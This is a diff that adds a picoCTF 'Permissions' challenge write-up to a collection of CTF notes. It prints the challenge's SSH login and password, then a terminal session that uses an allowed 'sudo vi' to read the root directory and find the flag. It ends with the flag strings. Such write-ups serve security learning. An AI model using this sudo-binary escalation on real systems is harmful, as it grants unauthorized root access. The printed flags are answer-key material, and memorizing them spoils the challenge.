@@ -702,3 +702,58 @@ https://ctftime.org/writeup/28917
 
 picoCTF{4p0110_1n_7h3_h0us3_dbd1bea4}
 
+### Permissions
+Description \
+Can you read files in the root file? \
+The system admin has provisioned an account for you on the main server: \
+`ssh -p 50965 picoplayer@saturn.picoctf.net` \
+Password: UYiOazkqY2 \
+Can you login and read the root file?
+```
+momo1126-picoctf@webshell:~$ ssh -p 50965 picoplayer@saturn.picoctf.net
+picoplayer@saturn.picoctf.net's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Mon Dec 30 04:33:21 2024 from 3.140.102.47
+picoplayer@challenge:~$ ls /root
+ls: cannot open directory '/root': Permission denied
+
+
+picoplayer@challenge:~$ sudo -l
+[sudo] password for picoplayer: 
+Matching Defaults entries for picoplayer on challenge:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User picoplayer may run the following commands on challenge:
+    (ALL) /usr/bin/vi
+
+    
+picoplayer@challenge:~$ sudo vi /root
+" ============================================================================
+" Netrw Directory Listing                                        (netrw v165)
+"   /root
+"   Sorted by      name
+"   Sort sequence: [\/]$,\<core\%(\.\d\+\)\=\>,\.h$,\.c$,\.cpp$,\~\=\*$,*,\.o$,\.obj$,\.info$,\.swp$,\.bak$,\~$
+"   Quick Help: <F1>:help  -:go up dir  D:delete  R:rename  s:sort-by  x:special
+" ==============================================================================
+../
+./
+.vim/                                                                                                                                
+.bashrc
+.flag.txt
+.profile
+```
+1. Go to .flag.txt, get the CTF
+#### Note: UNDERSTAND & REDO
+#### Reference
+https://github.com/snwau/picoCTF-2023-Writeup/blob/main/General%20Skills/Permissions/Permissions.md
+
+picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}
